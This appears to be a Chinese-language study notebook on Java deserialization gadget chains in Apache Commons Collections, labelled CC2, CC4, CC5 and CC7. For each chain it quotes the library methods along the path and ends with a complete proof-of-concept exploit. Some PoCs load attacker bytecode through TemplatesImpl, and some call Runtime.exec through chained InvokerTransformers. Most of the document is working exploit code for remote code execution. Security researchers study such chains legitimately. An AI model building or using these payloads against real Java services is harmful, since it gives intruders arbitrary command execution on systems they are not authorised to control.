## CC2

*影响commons-collections4 4.x版本*

- PriorityQueue (CB链前半部分)

```
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

执行heapify()

```
private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

size>0 执行 sifeDown()

```
private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
```

comparator!=null 执行 siftDownUsingComparator()

```
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

传入TrasformingComparator,执行TransformingComparator.compare()

- TransformingComparator

```
public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

令transformer=InvokeTransform，执行InvokeTranform.transform()

- InvokeTransform

```
public O transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class<?> cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var4) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var6) {
                InvocationTargetException ex = var6;
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
            }
        }
```

利用反射，执行TemplateImpl.newTransformer()加载字节码

- TemplateImpl

```
public synchronized Transformer newTransformer()
        throws TransformerConfigurationException
    {
        TransformerImpl transformer;

        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
            _indentNumber, _tfactory);

        if (_uriResolver != null) {
            transformer.setURIResolver(_uriResolver);
        }

        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
```

```
private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet)
                    _class[_transletIndex].getConstructor().newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setOverrideDefaultParser(_overrideDefaultParser);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException | IllegalAccessException |
                NoSuchMethodException | InvocationTargetException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString(), e);
        }
    }
```

```
private void defineTransletClasses()
        throws TransformerConfigurationException {

        if (_bytecodes == null) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
            throw new TransformerConfigurationException(err.toString());
        }

        TransletClassLoader loader = (TransletClassLoader)
            AccessController.doPrivileged(new PrivilegedAction() {
                public Object run() {
                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
                }
            });

        try {
            final int classCount = _bytecodes.length;
            _class = new Class[classCount];

            if (classCount > 1) {
                _auxClasses = new HashMap<>();
            }

            for (int i = 0; i < classCount; i++) {
                _class[i] = loader.defineClass(_bytecodes[i]);
                final Class superClass = _class[i].getSuperclass();

                // Check if this is the main class
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                    _transletIndex = i;
                }
                else {
                    _auxClasses.put(_class[i].getName(), _class[i]);
                }
            }

            if (_transletIndex < 0) {
                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
                throw new TransformerConfigurationException(err.toString());
            }
        }
        catch (ClassFormatError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (LinkageError e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

poc:

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class test {  
    public static void main(String[] args) throws NoSuchFieldException, NoSuchMethodException, IllegalAccessException, IOException, ClassNotFoundException {  
        TemplatesImpl templates = new TemplatesImpl();  
        setvalue(templates, "_name", "aabb");  
        setvalue(templates, "_class", null);  
        setvalue(templates, "_tfactory", new TransformerFactoryImpl());  
        byte[] bytes = Files.readAllBytes(Paths.get("C:\\Users\\Administrator\\Desktop\\demo\\src\\main\\java\\Evl.class"));  
        setvalue(templates, "_bytecodes", new byte[][]{bytes});  
        InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});  
        TransformingComparator transformingComparator = new TransformingComparator(newTransformer);  
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);  
        priorityQueue.add(templates);  
        setvalue(priorityQueue, "size", 2);  
        Serialize(priorityQueue);  
        Deserialize();  
    }  
  
    public static void setvalue(Object obj, String field, Object value) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {  
        Class<?> aClass = obj.getClass();  
        Field declaredField = aClass.getDeclaredField(field);  
        declaredField.setAccessible(true);  
        declaredField.set(obj, value);  
    }  
  
    public static void Serialize(Object obj) throws IOException {  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.txt"));  
        objectOutputStream.writeObject(obj);  
        objectOutputStream.close();  
    }  
    public static Object Deserialize() throws IOException, ClassNotFoundException {  
        Object o = new ObjectInputStream(new FileInputStream("ser.txt")).readObject();  
        return o;  
    }  
}
```

## CC4

*影响commons-collections4 4.x版本*

- PriorityQueue

	前面与CC2一样

```
private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        // Read in size, and any hidden stuff
        s.defaultReadObject();

        // Read in (and discard) array length
        s.readInt();

        SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
        queue = new Object[size];

        // Read in all elements.
        for (int i = 0; i < size; i++)
            queue[i] = s.readObject();

        // Elements are guaranteed to be in "proper order", but the
        // spec has never explained what that might be.
        heapify();
    }
```

```
private void heapify() {
        for (int i = (size >>> 1) - 1; i >= 0; i--)
            siftDown(i, (E) queue[i]);
    }
```

```
private void siftDown(int k, E x) {
        if (comparator != null)
            siftDownUsingComparator(k, x);
        else
            siftDownComparable(k, x);
    }
```

```
private void siftDownUsingComparator(int k, E x) {
        int half = size >>> 1;
        while (k < half) {
            int child = (k << 1) + 1;
            Object c = queue[child];
            int right = child + 1;
            if (right < size &&
                comparator.compare((E) c, (E) queue[right]) > 0)
                c = queue[child = right];
            if (comparator.compare(x, (E) c) <= 0)
                break;
            queue[k] = c;
            k = child;
        }
        queue[k] = x;
    }
```

- TransformingComparator

```
public int compare(I obj1, I obj2) {
        O value1 = this.transformer.transform(obj1);
        O value2 = this.transformer.transform(obj2);
        return this.decorated.compare(value1, value2);
    }
```

利用ChainedTransformer
	ConstantTransformer
	InstantiateTransformer 三个类中的transform方法执行TrAXFilter::带参构造

```
public TrAXFilter(Templates templates)  throws  
    TransformerConfigurationException  
{  
    _templates = templates;  
    _transformer = (TransformerImpl) templates.newTransformer();  
    _transformerHandler = new TransformerHandlerImpl(_transformer);  
    _useServicesMechanism = _transformer.useServicesMechnism();  
}
```

让templates=TemplatesImpl执行TemplatesImpl.newTransformer()加载字节码

poc

```
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.*;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.PriorityQueue;  
  
public class test {  
    public static void main(String[] args) throws NoSuchFieldException, NoSuchMethodException, IllegalAccessException, IOException, ClassNotFoundException {  
        TemplatesImpl templates = new TemplatesImpl();  
        setvalue(templates, "_name", "aabb");  
        setvalue(templates, "_class", null);  
        setvalue(templates, "_tfactory", new TransformerFactoryImpl());  
        byte[] bytes = Files.readAllBytes(Paths.get("C:\\Users\\Administrator\\Desktop\\demo\\src\\main\\java\\Evl.class"));  
        setvalue(templates, "_bytecodes", new byte[][]{bytes});  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class),  
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);  
        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);  
        setvalue(priorityQueue, "size", 2);  
        Serialize(priorityQueue);  
        Deserialize();  
    }  
  
    public static void setvalue(Object obj, String field, Object value) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {  
        Class<?> aClass = obj.getClass();  
        Field declaredField = aClass.getDeclaredField(field);  
        declaredField.setAccessible(true);  
        declaredField.set(obj, value);  
    }  
  
    public static void Serialize(Object obj) throws IOException {  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.txt"));  
        objectOutputStream.writeObject(obj);  
        objectOutputStream.close();  
    }  
    public static Object Deserialize() throws IOException, ClassNotFoundException {  
        Object o = new ObjectInputStream(new FileInputStream("ser.txt")).readObject();  
        return o;  
    }  
}
```

## CC5

*影响commons-collections 3.x版本*

- BadAttributeValueExpException

```
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
```

执行valObj=TiedMapEntry 执行TiedMapEntry.toString()

- TiedMapEntry

```
public String toString() {
        return getKey() + "=" + getValue();
    }
```

```
public Object getValue() {
        return map.get(key);
}
```

map = LazyMap LaMap.get()

- LazyMap

```
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

利用
ChainedTransformer.transform()
ConstantTransformer.transform()
InvokerTransformer.transform()

构造链

poc:

```
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.management.BadAttributeValueExpException;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class test {  
    public static void main(String[] args) throws NoSuchFieldException, NoSuchMethodException, IllegalAccessException, IOException, ClassNotFoundException {  
        Transformer[] transformers = {  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap hashMap = new HashMap();  
        Map decorate = LazyMap.decorate(hashMap, chainedTransformer);  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "1232");  
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);  
        setvalue(badAttributeValueExpException, "val", tiedMapEntry);  
        Serialize(badAttributeValueExpException);  
        Deserialize();  
    }  
  
    public static void setvalue(Object obj, String field, Object value) throws NoSuchMethodException, NoSuchFieldException, IllegalAccessException {  
        Class<?> aClass = obj.getClass();  
        Field declaredField = aClass.getDeclaredField(field);  
        declaredField.setAccessible(true);  
        declaredField.set(obj, value);  
    }  
  
    public static void Serialize(Object obj) throws IOException {  
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.txt"));  
        objectOutputStream.writeObject(obj);  
        objectOutputStream.close();  
    }  
    public static Object Deserialize() throws IOException, ClassNotFoundException {  
        Object o = new ObjectInputStream(new FileInputStream("ser.txt")).readObject();  
        return o;  
    }  
}
```

## CC7

*影响commons-collections 3.x版本*

- HashTable

```
 private void readObject(java.io.ObjectInputStream s)
         throws IOException, ClassNotFoundException
    {
        // Read in the length, threshold, and loadfactor
        s.defaultReadObject();

        // Read the original length of the array and number of elements
        int origlength = s.readInt();
        int elements = s.readInt();

        // Compute new size with a bit of room 5% to grow but
        // no larger than the original size.  Make the length
        // odd if it's large enough, this helps distribute the entries.
        // Guard against the length ending up zero, that's not valid.
        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
        if (length > elements && (length & 1) == 0)
            length--;
        if (origlength > 0 && length > origlength)
            length = origlength;
        table = new Entry<?,?>[length];
        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
        count = 0;

        // Read the number of elements and then all the key/value objects
        for (; elements > 0; elements--) {
            @SuppressWarnings("unchecked")
                K key = (K)s.readObject();
            @SuppressWarnings("unchecked")
                V value = (V)s.readObject();
            // synch could be eliminated for performance
            reconstitutionPut(table, key, value);
        }
    }
```

```
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
        throws StreamCorruptedException
    {
        if (value == null) {
            throw new java.io.StreamCorruptedException();
        }
        // Makes sure the key is not already in the hashtable.
        // This should not happen in deserialized version.
        int hash = key.hashCode();
        int index = (hash & 0x7FFFFFFF) % tab.length;
        for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
            if ((e.hash == hash) && e.key.equals(key)) {
                throw new java.io.StreamCorruptedException();
            }
        }
        // Creates the new entry.
        @SuppressWarnings("unchecked")
            Entry<K,V> e = (Entry<K,V>)tab[index];
        tab[index] = new Entry<>(hash, key, value, e);
        count++;
    }
```

- AbstractMapDecoder

```
public boolean equals(Object object) {
        if (object == this) {
            return true;
        }
        return map.equals(object);
    }
```

- AbstractMap

```
public boolean equals(Object o) {
        if (o == this)
            return true;

        if (!(o instanceof Map))
            return false;
        Map<?,?> m = (Map<?,?>) o;
        if (m.size() != size())
            return false;

        try {
            Iterator<Entry<K,V>> i = entrySet().iterator();
            while (i.hasNext()) {
                Entry<K,V> e = i.next();
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key)==null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key)))
                        return false;
                }
            }
        } catch (ClassCastException unused) {
            return false;
        } catch (NullPointerException unused) {
            return false;
        }

        return true
```

- LazyMap

```
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
```

poc:

```
package org.example;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Hashtable;  
import java.util.Map;  
  
public class CC7 {  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(null);  
  
        Map Map1 = new HashMap();  
        Map Map2 = new HashMap();  
  
        Map lazyMap1 = LazyMap.decorate(Map1, chainedTransformer);  
        lazyMap1.put("Aa", 1);  
  
        Map lazyMap2 = LazyMap.decorate(Map2, chainedTransformer);  
        lazyMap2.put("BB", 1);  
        Hashtable hashtable = new Hashtable();  
        hashtable.put(lazyMap1, 1);  
        hashtable.put(lazyMap2, 2);  
  
        setFieldValue(chainedTransformer, "iTransformers", transformers);  
  
        lazyMap2.remove("Aa");  
        serialize(hashtable);  
        unserialize();  
    }  
  
    public static void serialize(Object obj) throws Exception {  
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        outputStream.writeObject(obj);  
        outputStream.close();  
    }  
  
    public static void unserialize() throws Exception {  
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("ser.bin"));  
        Object obj = inputStream.readObject();  
    }  
  
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {  
        Field field = obj.getClass().getDeclaredField(fieldName);  
        field.setAccessible(true);  
        field.set(obj, value);  
    }  
}
```